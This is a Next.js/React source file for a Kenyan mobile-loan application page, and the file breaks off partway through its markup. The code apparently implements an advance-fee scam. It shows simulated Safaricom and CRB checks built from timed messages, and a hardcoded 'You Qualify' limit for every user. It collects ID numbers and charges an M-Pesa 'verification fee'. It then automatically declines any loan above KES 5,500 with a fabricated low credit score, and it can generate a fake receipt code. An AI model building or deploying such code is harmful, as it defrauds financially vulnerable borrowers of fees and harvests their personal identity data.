'use client';

import React, { useState, useEffect, Suspense, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { 
  ArrowLeft, 
  Banknote, 
  Smartphone, 
  CheckCircle2, 
  Loader2, 
  Lock, 
  MapPin,
  User,
  CreditCard,
  ChevronRight,
  BadgeCheck,
  AlertCircle,
  FileText,
  Briefcase,
  XCircle,
  RefreshCcw,
  ChevronDown,
  Wallet,
  Check,
  Info,
  SearchCheck,
  FileClock,
  Ban,
  ShieldCheck,
  TrendingUp,
  Server
} from 'lucide-react';
import { Button } from '@/components/ui/button';

// --- DATA CONSTANTS ---
const COUNTIES = [
  "Nairobi", "Mombasa", "Kisumu", "Nakuru", "Uasin Gishu", "Kiambu", "Machakos", "Kajiado", 
  "Meru", "Nyeri", "Kilifi", "Kakamega", "Kisii", "Bungoma", "Murang'a", "Trans Nzoia", 
  "Narok", "Kitui", "Kericho", "Bomet", "Busia", "Homa Bay", "Siaya", "Embu", "Makueni",
  "Kirinyaga", "Nyamira", "Kwale", "Laikipia", "Vihiga", "Migori", "Baringo", "Nyandarua",
  "Tharaka Nithi", "Taita Taveta", "West Pokot", "Nandi", "Elgeyo Marakwet", "Turkana",
  "Garissa", "Wajir", "Mandera", "Marsabit", "Isiolo", "Samburu", "Lamu", "Tana River"
];

const INCOME_RANGES = [
  "Ksh 0 - 10,000", "Ksh 10,001 - 25,000", "Ksh 25,001 - 50,000", 
  "Ksh 50,001 - 100,000", "Ksh 100,001 - 150,000", "Over Ksh 150,000"
];

const PURPOSES = [
  "Emergency", "Medical Bill", "School Fees", "Business Capital", "Rent", "Personal Use", "Farming"
];

const LOAN_TIERS = [
  { amount: 5500, fee: 100 },
  { amount: 6800, fee: 150 },
  { amount: 7800, fee: 170 },
  { amount: 9800, fee: 200 },
  { amount: 11200, fee: 230 },
  { amount: 16800, fee: 250 },
  { amount: 21200, fee: 270 },
  { amount: 25600, fee: 400 },
  { amount: 30000, fee: 470 },
  { amount: 35400, fee: 590 },
  { amount: 39800, fee: 730 },
  { amount: 44200, fee: 1010 },
  { amount: 48600, fee: 1600 },
];

const SAFE_LIMIT_THRESHOLD = 5500;

// --- CUSTOM COMPONENTS ---

const IconContainer = ({ children }: { children: React.ReactNode }) => (
  <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
    {children}
  </div>
);

const CustomSelect = ({ 
  label, 
  icon: Icon, 
  value, 
  options, 
  onChange, 
  placeholder = "Select..." 
}: { 
  label: string, 
  icon: any, 
  value: string, 
  options: string[], 
  onChange: (val: string) => void,
  placeholder?: string
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (ref.current && !ref.current.contains(event.target as Node)) {
        setIsOpen(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  return (
    <div className="relative" ref={ref}>
      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
      <button
        type="button"
        onClick={() => setIsOpen(!isOpen)}
        className={`w-full h-14 relative flex items-center rounded-xl border transition-all
          ${isOpen ? 'border-emerald-500 ring-1 ring-emerald-500 bg-white' : 'border-slate-200 bg-white hover:border-emerald-400'}
        `}
      >
        <IconContainer>
           <Icon className="w-5 h-5" />
        </IconContainer>
        <div className="flex-1 pl-16 pr-10 text-left overflow-hidden">
            <span className={`block truncate text-sm font-bold ${value ? 'text-slate-900' : 'text-slate-400'}`}>
               {value || placeholder}
            </span>
        </div>
        <div className="absolute right-4 text-slate-400">
           <ChevronDown className={`w-4 h-4 transition-transform ${isOpen ? 'rotate-180 text-emerald-500' : ''}`} />
        </div>
      </button>

      {isOpen && (
        <div className="absolute top-full left-0 right-0 mt-2 bg-white border border-slate-100 rounded-xl shadow-2xl z-50 max-h-60 overflow-y-auto animate-in fade-in zoom-in-95 duration-200">
          {options.map((option) => (
            <button
              key={option}
              type="button"
              onClick={() => {
                onChange(option);
                setIsOpen(false);
              }}
              className="w-full text-left px-4 py-3 text-sm font-bold text-slate-700 hover:bg-emerald-50 hover:text-emerald-700 flex items-center justify-between border-b border-slate-50 last:border-0"
            >
              {option}
              {value === option && <Check className="w-4 h-4 text-emerald-600" />}
            </button>
          ))}
        </div>
      )}
    </div>
  );
};

const CustomInput = ({
  label,
  icon: Icon,
  type = "text",
  value,
  onChange,
  placeholder
}: any) => (
  <div className="relative">
      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
      <div className="relative flex items-center h-14 w-full rounded-xl border border-slate-200 bg-white hover:border-emerald-400 focus-within:border-emerald-500 focus-within:ring-1 focus-within:ring-emerald-500 transition-all">
          <IconContainer>
              <Icon className="w-5 h-5" />
          </IconContainer>
          <input 
              type={type}
              className="w-full h-full pl-16 pr-4 bg-transparent outline-none text-slate-900 font-bold text-sm placeholder:text-slate-400"
              placeholder={placeholder}
              value={value}
              onChange={onChange}
          />
      </div>
  </div>
);

function QuickLoansContent() {
  const router = useRouter();
  
  // Steps: verify -> details -> qualify -> select -> summary -> stk_push -> payment_check -> payment_verified -> analyzing_crb -> success/high_limit_reject
  const [step, setStep] = useState('verify');
  
  // Data
  const [phone, setPhone] = useState('');
  const [details, setDetails] = useState({ fullName: '', idNumber: '', county: '', income: '', purpose: '' });
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [selectedTier, setSelectedTier] = useState<{amount: number, fee: number} | null>(null);
  const [trackingId] = useState(`LN-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
  const [checkoutRequestId, setCheckoutRequestId] = useState('');
  const [mpesaReceipt, setMpesaReceipt] = useState('');
  const [recoveryData, setRecoveryData] = useState<{
    retryCount: number;
    originalAmount: string;
    phone: string;
  } | null>(null);

  // UI
  const [loadingText, setLoadingText] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
  const [errorMsg, setErrorMsg] = useState('');
  const [manualCheckLoading, setManualCheckLoading] = useState(false);
  const [analysisProgress, setAnalysisProgress] = useState(0);

  // Refs
  const pollingInterval = useRef<NodeJS.Timeout | null>(null);

  // --- PERSISTENCE ---
  useEffect(() => {
    const saved = localStorage.getItem('ln_session');
    if (saved) {
        const data = JSON.parse(saved);
        if (Date.now() - data.timestamp < 30 * 60 * 1000) {
            setPhone(data.phone || '');
            setDetails(data.details || { fullName: '', idNumber: '', county: '', income: '', purpose: '' });
        }
    }
  }, []);

  useEffect(() => {
    if (phone && details.idNumber) {
        localStorage.setItem('ln_session', JSON.stringify({ phone, details, timestamp: Date.now() }));
    }
  }, [phone, details]);


  // Strict Inputs
  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 10);
    setPhone(val);
    setErrorMsg('');
  };

  const handleIdInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 8);
    setDetails({...details, idNumber: val});
  };

  // --- ACTIONS ---

  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length !== 10 || (!phone.startsWith('01') && !phone.startsWith('07'))) {
         setErrorMsg('Enter valid 10-digit Safaricom number');
         return;
    }
    setErrorMsg('');
    setIsProcessing(true);

    const sequence = [
        { t: 'Connecting to Safaricom...', d: 1500 },
        { t: 'Submitting Confirmed number to Authorised CRB checker...', d: 2500 },
        { t: 'Analyzing Credit History...', d: 1500 },
        { t: 'Identity Verified!', d: 800 }
    ];

    let totalDelay = 0;
    sequence.forEach(({ t, d }, i) => {
        totalDelay += d;
        setTimeout(() => {
            setLoadingText(t);
            if (i === sequence.length - 1) {
                setTimeout(() => {
                    setIsProcessing(false);
                    setStep('details');
                }, 800);
            }
        }, totalDelay);
    });
  };

  const handleDetails = (e: React.FormEvent) => {
    e.preventDefault();
    if (details.idNumber.length < 6) {
        setErrorMsg('ID Invalid');
        return;
    }
    if (!details.fullName || !details.idNumber || !details.county || !details.income || !details.purpose) {
        setErrorMsg('Fill all fields');
        return;
    }
    if (!termsAccepted) {
        setErrorMsg('You must accept the terms');
        return;
    }
    setErrorMsg('');
    setStep('qualify');
    window.scrollTo(0,0);
  };

  const handlePayment = async () => {
    if (!selectedTier) return;
    setIsProcessing(true);
    try {
        const res = await fetch('/api/stkpush', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                phoneNumber: phone,
                idNumber: details.idNumber,
                amount: selectedTier.fee,
                serviceType: 'LOAN_FEE'
            })
        });

        const data = await res.json();
        if (data.success) {
            setIsProcessing(false);
            setCheckoutRequestId(data.checkoutRequestID);
            setStep('stk_push');
            startPolling(data.checkoutRequestID);
        } else {
            alert(data.error || 'Connection failed');
            setIsProcessing(false);
        }
    } catch (err) {
        setIsProcessing(false);
        alert('Network Error');
    }
  };

  // --- LOGIC SPLIT: RECEIPT SCREEN ---
  const handlePaymentSuccess = (receipt: string) => {
    if (pollingInterval.current) clearInterval(pollingInterval.current);
    setMpesaReceipt(receipt || 'SIS' + Math.random().toString(36).substr(2,8).toUpperCase());
    setStep('payment_verified');
  };

  // --- CRB ANIMATION ---
  const startAnalysis = () => {
      setStep('analyzing_crb');
      const texts = [
        `Verifying Payment ${mpesaReceipt}...`,
        "Handshaking with Metropol CRB...",
        "Scanning Loan Repayment History...",
        "Calculating Risk & Interest...",
        "Finalizing Disbursement Decision..."
      ];
      let i = 0;
      setLoadingText(texts[0]);
      setAnalysisProgress(10);
      
      const interval = setInterval(() => {
        i++;
        if (i < texts.length) {
           setLoadingText(texts[i]);
           setAnalysisProgress(prev => Math.min(prev + 18, 95));
        } else {
           clearInterval(interval);
           setAnalysisProgress(100);
           setTimeout(() => {
             if (selectedTier && selectedTier.amount > SAFE_LIMIT_THRESHOLD) {
                setStep('high_limit_reject');
             } else {
                setStep('success'); 
             }
           }, 1000);
        }
      }, 1500);
  };

  // ENHANCED POLLING LOGIC
  const startPolling = (reqId: string) => {
    let attempts = 0;
    const MAX_ATTEMPTS = 180; 

    pollingInterval.current = setInterval(async () => {
      attempts++;
      
      if (attempts === 5) setPollMessage('Please check your phone and enter PIN...');
      else if (attempts === 60) setPollMessage('Transaction taking longer than usual...');
      else if (attempts % 15 === 0) setPollMessage('Waiting for M-Pesa confirmation...');

      try {
        const res = await fetch(`/api/check-status?id=${reqId}&action=poll`);
        const data = await res.json();
        
        if (data.status === 'COMPLETED') {
          handlePaymentSuccess(data.mpesaCode);
        } else if (data.status === 'FAILED') {
          if (pollingInterval.current) clearInterval(pollingInterval.current);
          setStep('failed');
        }

        if (attempts >= MAX_ATTEMPTS) {
          if (pollingInterval.current) clearInterval(pollingInterval.current);
          setRecoveryData({
            retryCount: data.retryCount || 0,
            originalAmount: data.originalAmount || (selectedTier?.fee.toString() || ''),
            phone: data.phone || phone
          });
          setStep('payment_check');
        }
      } catch(e) { console.error('Polling error:', e); }
    }, 2000);
  };

  // ENHANCED MANUAL CHECK
  const handleManualFetch = async () => {
    if (!checkoutRequestId) return;
    setManualCheckLoading(true);
    setErrorMsg('');
    try {
      const res = await fetch(`/api/check-status?id=${checkoutRequestId}&action=fetch`);
      const data = await res.json();
      setTimeout(() => {
        setManualCheckLoading(false);
        if (data.status === 'COMPLETED') {
          handlePaymentSuccess(data.mpesaCode);
        } else if (data.status === 'FAILED') {
          setStep('failed');
        } else {
          setErrorMsg('We still haven\'t received confirmation. If you paid, wait 30 seconds and try again.');
        }
      }, 1500);
    } catch (error) {
      setManualCheckLoading(false);
      setErrorMsg('Connection error.');
    }
  };

  // RETRY
  const handleRetrySamePayment = async () => {
    if (!checkoutRequestId || !selectedTier) return;
    setIsProcessing(true);
    setErrorMsg('');
    try {
      const res = await fetch('/api/stkpush', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          idNumber: details.idNumber,
          amount: selectedTier.fee,
          serviceType: 'LOAN_FEE'
        })
      });
      const data = await res.json();
      if (data.success) {
        setIsProcessing(false);
        setCheckoutRequestId(data.checkoutRequestID);
        setStep('stk_push');
        startPolling(data.checkoutRequestID);
      } else {
        setIsProcessing(false);
        setErrorMsg(data.error || 'Failed to retry payment');
      }
    } catch (err) {
      setIsProcessing(false);
      setErrorMsg('Network error.');
    }
  };

  const handleChooseDifferentAmount = () => {
    if (pollingInterval.current) clearInterval(pollingInterval.current);
    setCheckoutRequestId('');
    setSelectedTier(null);
    setTermsAccepted(false);
    setIsProcessing(false);
    setManualCheckLoading(false);
    setErrorMsg('');
    setStep('select');
    window.scrollTo(0, 0);
  };

  // Cleanup
  useEffect(() => {
    return () => {
        if (pollingInterval.current) clearInterval(pollingInterval.current);
    };
  }, []);

  return (
    <div className="max-w-md mx-auto px-4 py-8 pb-24">
      
      {/* ================= STEP 1: PHONE VERIFY ================= */}
      {step === 'verify' && (
        <div className="animate-in slide-in-from-bottom-4 duration-500">
           <div className="text-center mb-8">
              <h1 className="text-2xl font-black text-slate-900 mb-2 tracking-tight">Check Eligibility</h1>
              <p className="text-sm text-slate-500 font-medium">Enter M-Pesa number to check limit.</p>
           </div>

           <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100 p-6">
              {!isProcessing ? (
                  <form onSubmit={handleVerify} className="space-y-6">
                      <CustomInput 
                         label="Phone Number"
                         icon={Smartphone}
                         type="tel"
                         placeholder="0712345678"
                         value={phone}
                         onChange={handlePhoneInput}
                      />
                      
                      {errorMsg && (
                          <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold">
                              <AlertCircle className="w-4 h-4" /> {errorMsg}
                          </div>
                      )}

                      <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl text-base shadow-lg transition-transform hover:-translate-y-0.5">
                          Check Eligibility
                      </Button>
                  </form>
              ) : (
                  <div className="py-12 text-center space-y-6">
                      <Loader2 className="w-12 h-12 text-emerald-500 animate-spin mx-auto" />
                      <p className="text-sm font-bold text-slate-700 animate-pulse px-4 leading-relaxed">{loadingText}</p>
                  </div>
              )}
           </div>
        </div>
      )}

      {/* ================= STEP 2: DETAILS FORM ================= */}
      {step === 'details' && (
        <div className="animate-in slide-in-from-right duration-500">
             <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100">
                <div className="bg-emerald-50/50 p-5 border-b border-emerald-50 flex items-center justify-between rounded-t-xl">
                    <div>
                        <h2 className="text-xs font-bold text-emerald-800 uppercase tracking-wide">Verified</h2>
                        <p className="text-sm font-black text-slate-900 mt-0.5">{phone}</p>
                    </div>
                    <BadgeCheck className="w-6 h-6 text-emerald-500" />
                </div>

                <form onSubmit={handleDetails} className="p-6 space-y-5">
                    
                    <CustomInput 
                        label="Full Name"
                        icon={User}
                        placeholder="e.g. John Mwangi"
                        value={details.fullName}
                        onChange={(e: any) => setDetails({...details, fullName: e.target.value})}
                    />

                    <CustomInput 
                        label="ID Number"
                        icon={CreditCard}
                        type="tel"
                        placeholder="e.g. 12345678"
                        value={details.idNumber}
                        onChange={handleIdInput}
                    />

                    <CustomSelect 
                        label="County"
                        icon={MapPin}
                        value={details.county}
                        options={COUNTIES}
                        onChange={(val) => setDetails({...details, county: val})}
                        placeholder="Select County"
                    />

                    <div className="space-y-5">
                        <CustomSelect 
                            label="Monthly Income"
                            icon={Wallet}
                            value={details.income}
                            options={INCOME_RANGES}
                            onChange={(val) => setDetails({...details, income: val})}
                            placeholder="Select Range"
                        />
                        
                        <CustomSelect 
                            label="Loan Purpose"
                            icon={Briefcase}
                            value={details.purpose}
                            options={PURPOSES}
                            onChange={(val) => setDetails({...details, purpose: val})}
                            placeholder="Select Purpose"
                        />
                    </div>

                    <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 flex gap-3 items-start">
                        <div className="pt-0.5">
                            <input 
                                type="checkbox" 
                                id="terms"
                                checked={termsAccepted}
                                onChange={(e) => setTermsAccepted(e.target.checked)}
                                className="w-5 h-5 rounded border-slate-300 text-emerald-600 focus:ring-emerald-500 cursor-pointer"
                            />
                        </div>
                        <label htmlFor="terms" className="text-xs text-slate-500 font-medium leading-relaxed cursor-pointer">
                            I accept the <Link href="#" className="text-blue-600 underline">Terms & Conditions</Link>. I authorize CRB checks for my credit history and loan processing.
                        </label>
                    </div>

                    {errorMsg && (
                        <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
                            <AlertCircle className="w-4 h-4" /> {errorMsg}
                        </div>
                    )}

                    <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg transition-transform hover:-translate-y-0.5">
                        Check Qualification <ChevronRight className="w-4 h-4 ml-2" />
                    </Button>
                </form>
             </div>
        </div>
      )}

      {/* ================= STEP 3: QUALIFICATION ================= */}
      {step === 'qualify' && (
        <div className="animate-in zoom-in-95 duration-500">
             <div className="bg-white rounded-xl shadow-2xl p-8 text-center border border-slate-100 relative overflow-hidden">
                <div className="relative w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
                    <div className="absolute inset-0 bg-emerald-200 rounded-full opacity-20 animate-ping"></div>
                    <FileText className="w-9 h-9 text-emerald-600 relative z-10" />
                </div>

                <h2 className="text-2xl font-black text-slate-900 mb-2 tracking-tight">You Qualify!</h2>
                <p className="text-slate-500 font-medium mb-8 leading-relaxed">
                    Great news, <span className="text-slate-900 font-bold">{details.fullName.split(' ')[0]}</span>. 
                    Based on your profile, you are eligible for <span className="text-emerald-600 font-bold">{details.purpose}</span> funding.
                </p>

                <div className="bg-slate-50 rounded-xl p-6 border border-slate-200 mb-8">
                    <div className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Eligible Limit</div>
                    <div className="flex items-baseline justify-center gap-1">
                        <span className="text-sm font-bold text-slate-500">KES</span>
                        <span className="text-4xl font-black text-slate-900 tracking-tighter">57,828</span>
                    </div>
                    <div className="w-full bg-slate-200 h-1.5 rounded-full mt-4 mb-2 overflow-hidden">
                        <div className="h-full bg-emerald-500 w-[85%] rounded-full"></div>
                    </div>
                    <div className="flex justify-between text-[10px] font-bold text-slate-400">
                         <span>Min: 5,000</span>
                         <span>Max: 60,000</span>
                    </div>
                </div>

                <Button 
                    onClick={() => { setStep('select'); window.scrollTo(0,0); }}
                    className="w-full h-14 bg-emerald-500 hover:bg-emerald-400 text-white font-bold text-lg rounded-xl shadow-xl shadow-emerald-500/20 transition-transform hover:-translate-y-0.5"
                >
                    Select Loan Amount
                </Button>
             </div>
        </div>
      )}

      {/* ================= STEP 4: TIER SELECTION ================= */}
      {step === 'select' && (
        <div className="animate-in slide-in-from-right duration-500">
             <div className="text-center mb-8">
                <h2 className="text-2xl font-black text-slate-900 tracking-tight">Select Amount</h2>
                <p className="text-slate-500 font-medium">Choose a loan package that fits your needs.</p>
            </div>

            <div className="space-y-4">
                {LOAN_TIERS.map((tier) => (
                    <button
                        key={tier.amount}
                        onClick={() => { setSelectedTier(tier); setStep('summary'); window.scrollTo(0,0); }}
                        className="w-full bg-white rounded-xl p-5 border border-slate-100 hover:border-emerald-500 hover:shadow-lg hover:shadow-emerald-500/10 transition-all text-left flex items-center justify-between group relative overflow-hidden"
                    >
                        <div className="relative z-10">
                            <div className="text-2xl font-black text-slate-900 tracking-tight group-hover:text-emerald-600 transition-colors">
                                KES {tier.amount.toLocaleString()}
                            </div>
                            <div className="text-xs font-bold text-slate-400 mt-1">
                                Repay: KES {(tier.amount + tier.fee).toLocaleString()}
                            </div>
                        </div>
                        
                        <div className="relative z-10 text-right">
                            <div className="text-[10px] font-bold uppercase text-blue-600 bg-blue-50 px-3 py-1.5 rounded-lg mb-1 group-hover:bg-emerald-50 group-hover:text-emerald-600 transition-colors">
                                Fee: KES {tier.fee}
                            </div>
                        </div>
                        
                        <div className="absolute inset-0 bg-slate-50 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                    </button>
                ))}
            </div>
        </div>
      )}

      {/* ================= STEP 5: SUMMARY ================= */}
      {step === 'summary' && selectedTier && (
        <div className="animate-in slide-in-from-bottom-4 duration-500">
            <div className="bg-white rounded-xl shadow-2xl border border-slate-100 overflow-hidden">
                <div className="bg-slate-900 p-6 text-white text-center">
                    <h2 className="text-lg font-bold">Secure Your Loan</h2>
                    <p className="text-slate-400 text-xs mt-1">Complete the final step.</p>
                </div>

                <div className="p-6">
                    <div className="space-y-4 border-b border-slate-100 pb-6 mb-6">
                         <div className="flex justify-between items-center">
                            <span className="text-slate-500 text-sm font-bold uppercase">Borrower</span>
                            <span className="text-slate-900 font-bold text-sm">{details.fullName}</span>
                        </div>
                        <div className="flex justify-between items-center">
                            <span className="text-slate-500 text-sm font-bold uppercase">Purpose</span>
                            <div className="px-2 py-1 bg-slate-100 rounded text-xs font-bold text-slate-700">
                                {details.purpose}
                            </div>
                        </div>
                        <div className="h-px bg-slate-50 my-2"></div>
                        <div className="flex justify-between items-center">
                            <span className="text-slate-900 font-bold">Loan Amount</span>
                            <span className="text-2xl font-black text-slate-900 tracking-tight">KES {selectedTier.amount.toLocaleString()}</span>
                        </div>
                        
                        <div className="bg-blue-50/80 p-4 rounded-xl border border-blue-100 space-y-2">
                             <div className="flex justify-between items-center">
                                <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Processing Fee</span>
                                <span className="text-blue-900 font-black text-lg">KES {selectedTier.fee}</span>
                            </div>
                            <div className="flex gap-2 items-start">
                                <Info className="w-3 h-3 text-blue-600 mt-0.5 shrink-0" />
                                <p className="text-[10px] text-blue-700 font-medium leading-tight">
                                    <span className="font-bold">CRB Verification</span> Mandatory background check fee.
                                </p>
                            </div>
                        </div>
                        
                        <div className="flex justify-between text-xs pt-2">
                            <span className="text-slate-400 font-medium">Tracking ID</span>
                            <span className="text-slate-500 font-mono tracking-wide">{trackingId}</span>
                        </div>
                    </div>

                    <Button 
                        onClick={handlePayment}
                        disabled={isProcessing}
                        className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-white font-black text-lg rounded-xl shadow-xl shadow-emerald-500/20 transition-transform hover:-translate-y-0.5"
                    >
                        {isProcessing ? (
                            <div className="flex items-center gap-2">
                                <Loader2 className="w-5 h-5 animate-spin" />
                                <span>Processing...</span>
                            </div>
                        ) : (
                            <span>Pay KES {selectedTier.fee}</span>
                        )}
                    </Button>
                    
                    <button 
                        onClick={() => setStep('select')} 
                        className="w-full text-center mt-6 text-xs font-bold text-slate-400 hover:text-slate-600 transition-colors"
                    >
                        Select a different amount
                    </button>
                </div>
            </div>
        </div>
      )}

      {/* ================= STEP 6: STK PUSH ================= */}
      {step === 'stk_push' && selectedTier && (
        <div className="animate-in zoom-in-95 duration-500 pt-10 text-center max-w-sm mx-auto">
             <div className="bg-white p-8 rounded-xl shadow-2xl border border-slate-50 relative overflow-hidden">
                <div className="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-6 relative">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-20"></span>
                    <Smartphone className="w-10 h-10 text-emerald-600 relative z-10" />
                </div>
                
                <h2 className="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Check Your Phone</h2>
                <p className="text-slate-500 font-medium mb-6 leading-relaxed">
                    Enter PIN to pay <span className="text-emerald-600 font-bold">KES {selectedTier.fee}</span>.
                </p>

                <div className="bg-slate-50 rounded-xl p-4 mb-4 border border-slate-100">
                    <div className="flex justify-between items-center mb-3">
                        <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Status</span>
                        <span className="text-[10px] font-bold text-emerald-600 bg-emerald-100 px-3 py-1 rounded-full animate-pulse">
                            {pollMessage}
                        </span>
                    </div>
                    <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
                        <div className="h-full bg-emerald-500 animate-[width_240s_ease-in-out_forwards]" style={{width: '90%'}}></div>
                    </div>
                </div>
            </div>
        </div>
      )}

      {/* ================= STEP 7: RECEIPT BRIDGE ================= */}
      {step === 'payment_verified' && (
        <div className="pt-10 px-4 animate-in zoom-in-95 duration-500">
            <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden relative">
              {/* Receipt Rip Effect */}
              <div className="absolute top-0 left-0 w-full h-2 mask-radial bg-slate-100 opacity-50"></div>
              
              <div className="p-8 text-center">
                <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4 relative">
                   <div className="absolute inset-0 rounded-full bg-emerald-200 opacity-20 animate-ping"></div>
                   <CheckCircle2 className="w-8 h-8 text-emerald-600 relative z-10" />
                </div>
                <h2 className="text-xl font-black text-slate-900 mb-1">Fee Received</h2>
                <p className="text-xs text-slate-500 font-medium mb-6">Payment verified via M-Pesa.</p>

                {/* The Digital Receipt */}
                <div className="bg-slate-50 rounded-lg border border-slate-200 p-4 text-left space-y-3 font-mono text-xs mb-6 relative overflow-hidden">
                  <div className="flex justify-between border-b border-slate-200 pb-2">
                    <span className="text-slate-500">Receipt No:</span>
                    <span className="font-bold text-slate-900">{mpesaReceipt}</span>
                  </div>
                  <div className="flex justify-between border-b border-slate-200 pb-2">
                    <span className="text-slate-500">Service:</span>
                    <span className="font-bold text-slate-900">CRB Check</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Amount:</span>
                    <span className="font-bold text-emerald-600">KES {selectedTier?.fee}</span>
                  </div>
                </div>

                <Button 
                  onClick={() => startAnalysis()}
                  className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg transition-transform hover:-translate-y-1"
                >
                  Proceed to CRB Check
                </Button>
              </div>
            </div>
        </div>
      )}

      {/* ================= STEP 8: CRB ANIMATION ================= */}
      {step === 'analyzing_crb' && (
            <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700 px-6">
                <div className="relative w-20 h-20 mx-auto">
                   <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
                   <div className="absolute inset-0 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
                   <ShieldCheck className="absolute inset-0 m-auto w-8 h-8 text-emerald-600 animate-pulse" />
                </div>
                <div>
                   <h2 className="text-2xl font-black text-slate-900 mb-2">Analyzing Credit</h2>
                   <p className="text-sm font-bold text-emerald-600 animate-pulse">{loadingText}</p>
                </div>
                <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden">
                    <div className="h-full bg-emerald-500 transition-all duration-300 ease-out" style={{ width: `${analysisProgress}%` }}></div>
                </div>
            </div>
      )}

      {/* ================= STEP 9: SUCCESS (OPTIMISTIC) ================= */}
      {step === 'success' && selectedTier && (
         <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
             <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 className="w-10 h-10 text-emerald-600" />
            </div>
            
            <h2 className="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Application Submitted!</h2>
            <p className="text-slate-500 font-medium mb-8 px-4 leading-relaxed">
                Your request for <span className="text-slate-900 font-bold">KES {selectedTier.amount.toLocaleString()}</span> is now under priority review.
            </p>
            
            <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-6">
                 {/* Step 1: Fee - Done */}
                 <div className="flex gap-4">
                     <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">
                         <Check className="w-4 h-4" />
                     </div>
                     <div>
                         <h4 className="font-bold text-slate-900 text-sm">Fee Verified</h4>
                         <p className="text-xs text-slate-500 mt-0.5">Receipt: {mpesaReceipt}</p>
                     </div>
                 </div>

                 {/* Step 2: CRB - Pending */}
                 <div className="flex gap-4">
                     <div className="w-8 h-8 bg-yellow-100 text-yellow-600 rounded-full flex items-center justify-center font-bold text-sm shrink-0 animate-pulse">
                         <FileClock className="w-4 h-4" />
                     </div>
                     <div>
                         <h4 className="font-bold text-slate-900 text-sm">Disbursement Queue</h4>
                         <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
                            Final review in progress. Funds usually disbursed within 24 hours.
                         </p>
                     </div>
                 </div>

                 <div className="pt-4 border-t border-slate-50">
                    <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Tracking ID (Save This)</p>
                    <div className="font-mono text-sm font-bold text-slate-700 bg-slate-100 p-3 rounded-xl text-center select-all border border-slate-200">
                        {trackingId}
                    </div>
                 </div>
            </div>

            <Button onClick={() => router.push('/')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
                Return Home
            </Button>
         </div>
      )}

      {/* ================= STEP 9.5: REJECTED (High Amount) ================= */}
      {step === 'high_limit_reject' && selectedTier && (
             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
                <div className="w-20 h-20 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-6">
                    <Ban className="w-10 h-10 text-slate-500" />
                </div>
                
                <h2 className="text-2xl font-black text-slate-900 mb-2">Loan Declined</h2>
                <div className="bg-red-50 text-red-700 text-xs font-bold px-4 py-2 rounded-full inline-block mb-6">
                    CRB Check Completed • Score Too Low
                </div>
                
                {/* FINANCIAL REPORT FOR LOAN */}
                <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden mb-6 text-left">
                  <div className="bg-slate-50 p-4 border-b border-slate-100 flex justify-between items-center">
                     <span className="text-xs font-bold text-slate-500 uppercase">Credit Report</span>
                     <span className="text-[10px] font-mono text-slate-400">REF: {mpesaReceipt}</span>
                  </div>
                  
                  <div className="p-6">
